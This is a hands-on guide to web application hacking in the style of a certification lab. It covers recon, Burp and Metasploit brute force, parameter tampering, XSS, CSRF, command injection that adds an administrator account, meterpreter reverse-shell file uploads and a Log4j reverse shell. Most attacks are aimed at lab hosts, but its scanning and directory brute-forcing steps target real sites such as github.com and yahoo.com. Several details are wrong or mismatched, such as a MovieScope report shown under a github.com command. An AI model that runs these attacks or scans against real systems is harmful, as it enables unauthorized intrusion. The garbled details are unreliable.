# Hacking Web Applications

## Introduction

- Hacking web applications involves unauthorized access to a website or its associated data.

- Web applications enable dynamic interaction with servers through browsers, allowing users to submit and retrieve data. Unfortunately, this convenience makes them a prime target for attacks.

## Objective

- The objective is to perform web application hacking tasks, including footprinting, reconnaissance, vulnerability scanning, brute-force attacks, cross-site scripting, parameter tampering, and more.

## Overview of Web Applications

- Web applications act as an interface between users and web servers, executing tasks through server-side and client-side scripts. Their architecture influences data processing, making them a critical component of online business.

## Tasks

#### 1. Footprint the Web Infrastructure

   - Perform web application reconnaissance using Nmap and Telnet.
   - Perform web application reconnaissance using WhatWeb.
   - Perform web spidering using OWASP ZAP.
   - Detect load balancers using various tools.
   - Identify web server directories using various tools.
   - Perform web application vulnerability scanning using Vega.
   - Identify clickjacking vulnerability using ClickjackPoc.

#### 2. Perform Web Application Attack
   - Perform a brute-force attack using Burp Suite.
   - Perform parameter tampering using Burp Suite.
   - Identify XSS vulnerabilities using PwnXSS.
   - Exploit parameter tampering and XSS vulnerabilities.
   - Perform Cross-Site Request Forgery (CSRF) Attack.
   - Enumerate and hack a web application using WPScan and Metasploit.
   - Exploit a Remote Command Execution Vulnerability.
   - Exploit a file upload vulnerability at different scanning levels.
   - Gain access by exploiting Log4j vulnerability.

#### 3. Detect Web Application Vulnerabilities
   - Detect web application vulnerabilities using N-Stalker Web Application Security Scanner.

---
### 1. Footprint the Web Infrastructure

- Web infrastructure footprinting involves gathering comprehensive information about the target web application, its components, and their functionality. This initial step in web application hacking is crucial for ethical hackers or pen testers to understand the target organization's website and identify potential vulnerabilities.

- We will focuses on performing web application footprinting using various techniques and tools such as web spidering and vulnerability scanning. Web infrastructure footprinting aids in identifying vulnerable web applications, understanding their connections, technologies in use, and pinpointing vulnerabilities within the web app architecture. Exploiting these vulnerabilities can lead to unauthorized access.

- Footprinting the web infrastructure enables attackers to:

---

| Web Infrastructure Footprinting Technique         | Description                                                                                                             |
|----------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------|
| Server Discovery                                   | Identify physical servers hosting the web application using Whois Lookup, DNS Interrogation, and Port Scanning.          |
| Service Discovery                                  | Discover services running on web servers to determine potential attack paths.                                           |
| Server Identification                              | Use banner-grabbing to obtain server banners, identifying the web server software make and version.                    |
| Hidden Content Discovery                            | Extract content and functionality not directly linked to or reachable from the main visible content.                    |

---
#### Perform Web Application Reconnaissance using Nmap and Telnet

- Web application reconnaissance involves gathering crucial information about the target, including server details, open ports, and server-side technologies.


- **Whois Lookup:**
   - Perform a Whois lookup to gather information about the target website's IP address, registration details, name servers, and location.
     - Use tools like [Netcraft](https://www.netcraft.com), [SmartWhois](https://www.tamos.com), [WHOIS Lookup](https://whois.domaintools.com), and [Batch IP Converter](http://www.sabsoft.com).
     - Example Command:
       ```bash
       whois github.com
       ```

- **DNS Interrogation:**
   - Use tools such as [DNSRecon](https://github.com), [DNS Records](https://networktools.com), and [Domain Dossier](https://centralops.net) to gather information about DNS servers, records, and server types used by the target organization.
     - Example Command (using DNSRecon):
       ```bash
       dnsrecon -d github.com
       ```
     - Example Command (using Domain Dossier):
       ```bash
       domain-dossier github.com
       ```

- **Port Scanning:**
   - Open a terminal and run an Nmap scan for port and service discovery.
     ```bash
     sudo su
     cd
     nmap -T4 -A -v github.com
     ```
   - Examine the results for open ports and services.

- **Banner Grabbing:**
   - Establish a telnet connection to the target web server to identify the make, model, and version.
     ```bash
     telnet github.com 80
     ```
   - Send the GET / HTTP/1.0 command to retrieve banner information.

- **Documentation:**
   - Document acquired information, including server IP, DNS names, location, server type, open ports, services, and web server details.

#### Perform Web Application Reconnaissance using WhatWeb

- WhatWeb is a tool used to identify websites and recognize web technologies, including content management systems (CMS), blogging platforms, statistics and analytics packages, JavaScript libraries, web servers, and embedded devices. It also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.

- Type `whatweb` to display a list of commands available with WhatWeb.

- Type `whatweb [Target Web Application]` (here, the target web application is github.com) to perform website footprinting. The result appears, displaying the GitHub website infrastructure.

- Type `whatweb -v [Target Web Application]` (here, the target web application is github.com) to run a verbosity scan. The result appears, displaying a detailed report on the target website, including its IP address, plugin information, and HTTP header information.

    ```bash
    whatweb -v github.com
    ```

- Type `whatweb --log-verbose=GitHub_Report github.com` and press Enter to export the results as a text file named GitHub_Report in the root folder.

- The GitHub_Report text file contains detailed reconnaissance information.


    **MovieScope_Report:**

    ```plaintext
    #whatweb --log-verbose=GitHub_Report github.com
    ASP.NET [4.0.30319], Country[RESERVED], HTTPServer[Microsoft-IIS/10.0], IP[10.10.1.19], Meta-Author[EC-Council], Microsoft-IIS[10.0], Modernizr, PasswordField[txtpwd], Script, Title[Login - MovieScope], X-Powered-By[ASP.NET]
    ```

#### Perform Web Spidering using OWASP ZAP

- OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool designed for finding vulnerabilities in web applications. It caters to various skill levels, offering both automated scanners and manual tools for security testing. Here, we will focus on web spidering using OWASP ZAP on the target website.

- Type `zaproxy` to launch OWASP ZAP. Wait for the OWASP ZAP initializing window to complete.

- If prompted to persist the ZAP session, select "No, I do not want to persist this session" and click Start.

- The OWASP ZAP main window appears. Under the Quick Start tab, click Automated Scan.

- In the Automated Scan wizard, enter the target website (github.com) under the URL to attack field and click Attack.

- OWASP ZAP starts scanning the target website; observe URLs under the Spider tab.

- After web spidering, OWASP ZAP performs active scanning. Navigate to the Active Scan tab to observe scanned links.

- After completing the active scan, results appear under the Alerts tab, displaying vulnerabilities and issues associated with the target website.

- Click on the Spider tab to view web spidering information, focusing on the URLs tab for hidden content.

- Navigate to the Messages tab under the Spider tab to view detailed information regarding URLs obtained during web spidering.

- In real-time, attackers perform web spidering to discover hidden content, exploit user privileges, and recover sensitive data. Web spidering reveals new functionality not linked to the main application.


#### Detect Load Balancers using Various Tools

Load balancers are integral for distributing web server load across multiple servers, enhancing productivity, and ensuring the reliability of web applications. Two common types are DNS load balancers (Layer 4) and HTTP load balancers (Layer 7). Here, we'll use the `dig` command and the Load Balancing Detector (`lbd`) tool to identify load balancers on the target website, `www.yahoo.com`.

- Type `dig yahoo.com` and press Enter. The result will display `available load balancers`, where a single host resolving to multiple IP addresses suggests the use of a load balancer.

- Type `lbd yahoo.com` and press Enter. The result will show `DNS load balancers` used by the target website, analyzing Server: and Date: headers and differences between server answers.

**Note:** 

- The `dig` command provides detailed results, identifying if the target domain resolves to multiple IP addresses. 
- The `lbd` detects load balancers using Server: and Date: headers in HTTP responses, analyzing differences between server answers.

#### Identify Web Server Directories using Various Tools

- Web servers hosting applications are prone to misconfigurations, potentially exposing critical files and directories. Ethical hackers and penetration testers use automated tools like Nmap, Gobuster, and Dirsearch to identify exposed web server directories. This information aids in discovering sensitive data within files and folders.

- Identifying web server directories using Nmap, Gobuster, and Dirsearch.
---

| Identification Tool                 | Command                                    | Description                                                                                                     |
| ----------------------------------- | ------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
| Nmap                                | `nmap -sv --script=http-enum github.com`   | Identify open ports, services, and versions. Observe identified web server directories under http-enum section. |
| Gobuster                            | `gobuster dir -u github.com -w common.txt` | Brute-force directories. Observe identified web server directories.                                             |
| Dirsearch                           | `dirsearch -u http://github.com`           | Perform directory brute-forcing. Observe listed directories and files.                                          |
| Dirsearch (specific file extension) | `dirsearch -u http://github.com -e aspx`   | Perform directory brute-forcing on a specific file extension.                                                   |
| Dirsearch (exclude status code 403) | `dirsearch -u http://github.com -x 403`    | Perform directory brute-forcing excluding status code 403.                                                      |

---

#### Identify Clickjacking Vulnerability using ClickjackPoc

- Clickjacking, a UI redress attack, deceives users into unintentionally clicking on elements on a different page, often controlled by attackers. We can identify a clickjacking vulnerability using [ClickjackPoc](https://github.com/Raiders0786/ClickjackPoc).


- Create a file named `domain.txt` with the target website link by running:
    ```bash
    echo "http://github.com" | tee domain.txt
    ```

- Start the clickjacking vulnerability scan using:
    ```bash
    python3 clickJackPoc.py -f domain.txt
    ```

- View the scan result indicating clickjacking vulnerability. open `github.com.html` with Browser and confirm clickjacking vulnerability.

### 2. Perform Web Application Attacks

- After gathering the necessary information about the target web application, the next step is to perform web application attacks. This requires expertise to test the security infrastructure thoroughly.

- Attackers have specific goals, whether technical or non-technical. Breaching the security of a web application to steal sensitive information is a common motive. The attacker analyzes the web app, identifies vulnerable areas, and attempts to reduce the "attack surface". Various application-level attacks, such as `injection`, `XSS`, `broken authentication`, `broken access control`, `security misconfiguration`, and `insecure deserialization`, are utilized.

- Web applications are accessed through various layers, including custom web applications, third-party components, databases, web servers, OSes, networks, and security mechanisms.

#### Perform a Brute-force Attack using Burp Suite

- [Burp Suite](https://portswigger.net/burp) is an integrated platform for security testing in web applications. It offers tools that support the entire testing process, from mapping and analysis to finding and exploiting vulnerabilities.

1. **Configure Browser Proxy Settings:**
   - Open Mozilla Firefox.
   - Go to Preferences > Network Settings.
   - Configure Manual Proxy with `127.0.0.1` and Port `8080`.

2. **Launch Burp Suite:**
   - Open Burp Suite from Applications menu.
   - Use default settings; start Burp Suite.

3. **Configure Burp Suite:**
   - Click Proxy > Options.
   - Ensure `Intercept` is on.

4. **Perform Brute-force Attack:**
   - Go back to the browser; visit target WordPress site.
   - Set up Burp Suite to intercept the request.
   - Switch to Burp Suite; send intercepted request to `Intruder`.

5. **Configure Intruder:**
   - In the Intruder tab, set `target` host and port.
   - In `Positions` tab, clear default payload values.
   - Select `Attack type` as `Cluster bomb`.

6. **Set Payloads:**
   - Add `username` and `password` as `payload values`.
   - Load `wordlist` files for `usernames` and `passwords`.

7. **Launch Attack:**
   - Click Start attack.
   - Wait for the progress bar to complete.
   - Scroll down in Intruder tab to view results.
   - Note down successful credentials.

8. **Complete the Attack:**
    - Close Intruder attack window.
    - Turn off Intercept in Burp Suite.
    - Undo proxy settings in the browser.

9. **Verify Successful Login:**
    - Reload target website.
    - Log in using obtained credentials.
    - Confirm successful login.

#### Perform Parameter Tampering using Burp Suite

- A web parameter tampering attack involves manipulating parameters exchanged between the client and server to modify application data, such as user credentials, permissions, product prices, and quantities. We can use Burp Suite for parameter tampering on the target website (www.moviescope.com).



1. **Set up Burp Suite Proxy**
   - Launch Mozilla Firefox and navigate to http://www.moviescope.com.
   - Open Firefox Preferences, type 'proxy' in the search bar, and go to Network Settings.
   - Configure manual proxy settings.
   - Launch Burp Suite.

2. **Initialize Burp Suite**
   - Select 'Temporary project' and click Next.
   - Choose 'Use Burp defaults' and click 'Start Burp.'
   - Navigate to the Proxy tab in the Burp Suite main window.
   - Ensure interception is active (`Intercept is on`).

3. **Login to Target Website**
   - Switch back to the browser, log in with credentials (sam/test).
   - Observe the intercepted HTTP request in Burp Suite.

4. **Forward Requests**
   - Click Forward until logged into the user account.
   - Switch to the browser, confirm the successful login.

5. **View User Profile**
   - Click 'View Profile' in the browser.
   - In Burp Suite, keep forwarding until you see the HTTP request.

6. **Modify Parameters in Burp Suite**
   - Expand the `Inspector`, click to expand `Query Parameters`.
   - Double-click on the value in the `VALUE` column.
   - Change the VALUE from 1 to 2, click `Apply Changes`.
   - In Burp Suite, turn off interception (`Intercept is off`).

7. **Verify Parameter Tampering**
    - Switch to the browser, observe the changed user account (ID=2).
    - Edit the ID parameter with a random numeric value in Burp Suite.
    - Verify changes in the browser.

#### Identifying XSS Vulnerabilities in Web Applications using PwnXSS

- [PwnXSS](https://github.com/pwn0sec/PwnXSS), an open-source XSS scanner, is utilized in this task to detect cross-site scripting (XSS) vulnerabilities on websites. The tool, written in Python, provides multiprocessing capabilities and customization options.

1. **Initiate XSS Scan**
   - Run PwnXSS with a target URL using:
     ```bash
     python3 pwnxss.py -u http://testphp.vulnweb.com
     ```
   - Note: Customize the target URL if needed.

2. **Review Scan Results**
   - Examine identified vulnerable website links displayed in the terminal.

3. **Copy Detected XSS Link and open**
   - Copy any Query (GET) link under Detected XSS section.
   - Paste the copied link in the address bar of browser.
   - Confirm the effectiveness of XSS vulnerability on the opened link.



#### Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications

- `Parameter tampering` directly targets an application's business logic, exploiting weaknesses in integrity and logic validation. `XSS attacks`, on the other hand, take advantage of vulnerabilities in dynamically generated web pages, allowing malicious actors to inject client-side scripts.

- **Parameter Tampering Attack:**
    - Parameter tampering is a straightforward attack aimed at manipulating an application's parameters, often exploiting vulnerabilities in validation mechanisms. 
    - Successful parameter tampering attacks can lead to XSS or SQL injection exploits.

- **XSS Attacks:**
    - XSS attacks involve injecting malicious scripts (`JavaScript`, `VBScript`, `ActiveX`, `HTML`, or `Flash`) into dynamically generated web pages. 
    - Attackers hide these scripts within legitimate requests, leading to their execution on a victim's system when viewed.

- Navigate to http://www.moviescope.com. and log in as a registered user.

1. **Parameter Tampering:**
   - Click on the View Profile tab.
   - Observe the ID value (e.g., 4) in the address bar.
   - Change the parameter to id=1 or id=3; observe profile changes.
   - This process is known as parameter tampering.

2. **XSS Attack:**
   - Click on the Contacts tab.
   - Enter a name and inject an XSS script in the Comment field.
   - Submit the comment to test for XSS vulnerability.
   - Refresh the Contacts page to confirm successful script injection.

---

#### Perform Cross-site Request Forgery (CSRF) Attack

This task demonstrates the execution of a Cross-site Request Forgery (CSRF) attack using WPScan on a WordPress website hosted on a victim machine. CSRF is a type of attack wherein a malicious website tricks a user's browser into performing unwanted actions on a targeted site where the user is authenticated.

##### Local Setup (Victim Machine):

1. Start Wampserver64 by typing 'wampserver' in the search bar and launching it on the victim machine (assumed to be a Windows machine).

2. Wait for the WampServer icon to turn green, indicating successful operation.

##### WordPress Website Configuration:

3. Open Firefox and navigate to the victim WordPress website: e.g., [http://10.10.1.22:8080/CEH/wp-login.php](http://10.10.1.22:8080/CEH/wp-login.php).

4. Log in with the credentials 'admin' and 'qwerty@123' (obtained in the previous task).

5. Activate the 'leenk.me' plugin in the Installed Plugins section.

6. Configure 'leenk.me' plugin settings as follows:
   - Activate the plugin.
   - Tick the Facebook checkbox under Administrator Options.
   - Save Settings.
   - Click on 'Facebook Settings' and set the Message Settings.

##### Attacker Machine Configuration:

7. Switch to the attacker machine, open Firefox, and visit [https://wpscan.com/register](https://wpscan.com/register) to create a WPScan account.

8. Complete registration, agree to terms, and verify your email.

9. Log in to WPScan, go to Edit Profile, and note the provided API Token.

##### Execute CSRF Attack:

10. Run WPScan command with obtained API Token:
    ```bash
    wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp
    ```

11. Examine results for identified vulnerable plugins, especially 'leenk.me.'

12. Copy the 'Security_Script.html' file from the Desktop (this script is used to exploit CSRF vulnerability).

##### Victim Machine Exploitation:

13. Access the Windows (Victim) shared folders:
    - Click 'Places' at the top of the Desktop.
    - Select 'Network' and press 'Ctrl+L,' type 'smb://10.10.1.11,' and press 'Enter.'
    - Enter Windows machine credentials (Just for POC) and click 'Connect.'
    - Paste 'Security_Script.html' in CEH folder.

14. You will be redirected to the Facebook Settings page of the leenk.me plugin, confirming a successful CSRF attack.

---

**Note:** The 'Security_Script.html' file is a script used in the CSRF attack demonstration. It exploits the vulnerability in the 'leenk.me' plugin, leading to unauthorized changes in Facebook Settings when executed in the victim's browser, showcasing a successful CSRF attack.

---
#### Enumerate and Hack a Web Application using WPScan and Metasploit

In this task, we'll leverage the Metasploit Framework and WPScan to perform targeted attacks on a vulnerable PHP website (WordPress) with the goal of extracting sensitive information like usernames and passwords.

##### Wampserver Setup
1. Launch Wampserver64 by searching 'wampserver64' in victim machine and wait for the icon to turn green (for demonstration purpose).

##### WPScan Enumeration
2. Run WPScan to enumerate usernames:
    ```bash
    wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u
    ```
   Note: Use the API token obtained from [https://wpscan.com/register](https://wpscan.com/register).

3. Examine the results for identified usernames, especially in the 'User(s) Identified' section.

##### Metasploit Password Crack
4. Launch Metasploit:
    ```bash
    service postgresql start
    msfconsole
    ```

5. Inside Metasploit, set up the password cracking module:
    ```bash
    use auxiliary/scanner/http/wordpress_login_enum
    show options
    ```

6. Configure the module with the obtained information:
    ```bash
    set PASS_FILE password.txt
    set RHOSTS 10.10.1.22
    set RPORT 8080
    set TARGETURI http://10.10.1.22:8080/CEH
    set USERNAME admin
    ```

7. Run the module:
    ```bash
    run
    ```

8. Observe the brute-force process and note the cracked password (e.g., qwerty@123).

##### Web Application Login
9. Log in to the WordPress website using the obtained credentials:
    - URL: http://10.10.1.22:8080/CEH/wplogin.php
    - Username: admin
    - Password: qwerty@123

10. Confirm successful login and access the website content.

11. Repeat Steps 2-10 for other enumerated usernames.

- This concludes the demonstration of enumerating and hacking a web application using WPScan and Metasploit.

---
#### Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server

- Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application designed to test and enhance security skills. In this task, we exploit a command-line execution vulnerability in DVWA, demonstrating the extraction of information, user account creation, privilege escalation, and remote login to the target machine.

- Open Mozilla Firefox and navigate to DVWA login page: http://10.10.1.22:8080/dvwa/login.php.

- Log in with credentials:
   - Username: admin
   - Password: password

- Click on "Command Injection" in the left pane.

- Under "Ping a device," enter the IP address of Windows Server (e.g., 10.10.1.22) and click "Submit."

- DVWA successfully pings the target machine.

- Try a different command. Enter `| hostname` and click "Submit."

- An error is returned, indicating the application is secure.

- Click on "DVWA Security" and set the security level to "Low." Click "Submit".

- Click on "Command Injection" again.

- Enter `| hostname` and click "Submit." DVWA returns the target machine's name.

- Execute more commands (e.g., `| whoami`, `| tasklist`, `| dir C:\`, `| net user`, etc.) to gather information.

- Terminate a process. Choose a process from the list, note its PID, and use `Taskkill` to terminate it.(e.g., `| Taskkill /PID [Process ID value of the desired process] /F` )

- View the directory structure of the C drive by entering `| dir C:\` and clicking "Submit."

- Execute commands to view other directories and obtain information related to user accounts (`| net user`).

- Use the command execution vulnerability to add a user account named "Test" (`| net user Test /Add`).

- View the new user account by entering `net user`.

- View the Test account's information by entering `net user Test`.

- Grant administrative privileges to the Test account (`net localgroup Administrators Test /Add`).

- Confirm the new setting by entering `net user Test`.

- Use Remote Desktop Connection to log in remotely with the Test account (leave the password field empty).

- This concludes the demonstration of exploiting a remote command execution vulnerability to compromise a target web server.

---
#### Exploit a File Upload Vulnerability at Different Security Levels

##### Low Security Level:

1. **Generate the raw payload:**
    ```bash
    msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address] LPORT=4444 -f raw
    ```
    Replace `[IP Address]` with the Attacker IP Address.

2. **Copy the generated payload.**

3. **Create and edit `upload.php`:**
    ```bash
    pluma upload.php
    ```
    Paste the copied payload, save, and close.

4. **Launch Firefox, go to** http://10.10.1.22:8080/dvwa/login.php, log in (admin/password).

5. **Change DVWA security level to low.**

6. **Access File Upload and upload `upload.php`.**

7. **Open a terminal and open msfconsole:**
    ```bash
    msfconsole
    ```

8. **Inside Metasploit:**
    ```bash
    use exploit/multi/handler
    set payload php/meterpreter/reverse_tcp
    set LHOST 10.10.1.13
    set LPORT 4444
    run
    ```

9. **In Firefox, go to** http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php.

10. **Observe successful Meterpreter session in the terminal:**
    ```bash
    sysinfo
    ```

##### Medium Security Level:

1. **Generate Malicious Payload:**
    ```bash
    msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=3333 -f raw
    ```
    Copy the generated payload.

2. **Create and edit jpg file:**
    ```bash
    pluma medium.php.jpg
    ```
    Paste the copied payload, save, and close the editor.

3. **Access DVWA Login Page:**
    Open Firefox and visit: `http://10.10.1.22:8080/dvwa/login.php`
    Login with credentials: `admin` / `password`

4. **Adjust DVWA Security Level:**
    Navigate to DVWA Security, set the level from `impossible` to `medium`, and submit.

5. **Exploit File Upload Vulnerability:**
    Navigate to File Upload, click Browse, select `medium.php.jpg`, and click Upload.

6. **Configure Burp Suite Proxy:**
    - Open Firefox Preferences, set manual proxy to `127.0.0.1:8080`.

7. **Launch Burp Suite:**

8. **Intercept File Upload Request:**
    Upload the payload file through DVWA and intercept the request in Burp Suite.

9. **Forward the Request:**
    Change the filename to `medium.php` in Burp Suite and click Forward.

10. **Disable Intercept:**
    Turn off interception in Burp Suite and close the window.

11. **Confirm Upload:**
    Observe the successful upload message in the browser.

12. **Revert Proxy Settings:**
    Remove the browser proxy settings and close the tab.

13. **Set Up Meterpreter Listener:**
    ```bash
    msfconsole
    use exploit/multi/handler
    set payload php/meterpreter/reverse_tcp
    set LHOST 10.10.1.13
    set LPORT 3333
    run
    ```

14. **Execute Payload:**
    In a new Firefox tab, type: `http://10.10.1.22:8080/dvwa/hackable/uploads/medium.php`.

15. **Confirm Meterpreter Session:**
    Observe the Meterpreter session in the Terminal.

16. **View System Details:**
    ```bash
    sysinfo
    ```

##### High Security Level:

1. **Generate Payload:**
    ```bash
    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=2222 -f raw
    ```
    - Copy the generated payload.

2. **Edit Payload File:**
    ```bash
    pluma high.jpeg
    ```
    - Paste the payload, add `GIF98` to the first line, and save.

3. **Access DVWA:**
    - Open Firefox, visit http://10.10.1.22:8080/dvwa/login.php
    - Login: admin, Password: password

4. **Change Security Level:**
    - Go to DVWA Security > Set security level to High.

5. **Upload Payload:**
    - Navigate to File Upload, select the edited payload file, and upload.
    - Note the successful upload message.

6. **Command Injection:**
    - Navigate to Command Injection.
    - Enter IP: `10.10.1.13`, Command: `copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php`.
    - Submit and note the success message.

7. **Prepare Listener:**
    ```bash
    msfconsole
    ```
    - In Metasploit:
        ```bash
        use exploit/multi/handler
        set payload php/meterpreter/reverse_tcp
        set LHOST 10.10.1.13
        set LPORT 2222
        run
        ```

8. **Execute Payload:**
    - Open a new Firefox tab, visit http://10.10.1.22:8080/dvwa/hackable/uploads/shell.php

9. **Meterpreter Session:**
    - Switch to the Terminal; Meterpreter session should be established.

10. **View System Info:**
    ```bash
    sysinfo
    ```
---

#### Gain Access by Exploiting Log4j Vulnerability

[Log4j](https://github.com/kozmer/log4j-shell-poc) is an open-source framework that helps developers store various types of logs produced by users. Log4j, also known as Log4shell and LogJam, is a zero-day RCE (Remote Code Execution) vulnerability tracked under CVE-2021—44228. Log4j enables insecure JNDI lookups, which, when paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code. Here, we will gain backdoor access by exploiting the Log4j vulnerability.

**Note:** In this scenario, we'll install a vulnerable application on the Ubuntu machine and use the Parrot Security machine as the host machine to target the application. Ensure that the Parrot Security virtual machine is running.

##### Target Machine

1. Install Docker on the Ubuntu machine:
   ```bash
   sudo apt-get update
   sudo apt-get install docker.io
   ```

2. Navigate to the log4j-shell-poc directory:
   ```bash
   cd log4j-shell-poc/
   ```

3. Set up the Log4j vulnerable server:
   ```bash
   docker build -t log4jshell-poc .
   docker run --network host log4j-shell-poc
   ```
   Leave the server running on the Ubuntu machine.

##### Attacker Machine

4. Switch to the Parrot Security virtual machine.
5. Open Firefox and navigate to http://10.10.1.9:8080.
6. Observe that the Log4j vulnerable server is running successfully.

7. Navigate to the log4j-shell-poc directory:
    ```bash
    cd log4j-shell-poc
    ```

8. Install JDK 8:
    ```bash
    tar -xf jdk-8u202-linux-x64.tar.gz
    mv jdk1.8.0_202 /usr/bin/
    ```

9. Update the JDK path in the poc.py file:
    ```bash
    pluma poc.py
    ```
    Replace 'jdk1.8.0_20/bin/javac' with '/usr/bin/jdk1.8.0_202/bin/javac' (lines 62, 87, and 99).

10. Save and close the poc.py file.

11. Initiate a Netcat listener:
    ```bash
    nc -lvp 9001
    ```

12. In a new terminal window, execute the exploitation and payload creation:
    ```bash
    python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
    ```

13. Copy the payload generated in the 'Send me:' section.

14. Switch to the Firefox browser, paste the payload in the Username field, type 'password' in the Password field, and press Login.
   - Note: In the Password field you can enter any password.

15. Observe the Netcat listener for the reverse shell.

16. Execute commands in the listener window to explore the target system (e.g., `pwd`, `whoami`).

17. You now have shell access to the target web application as a root user.

---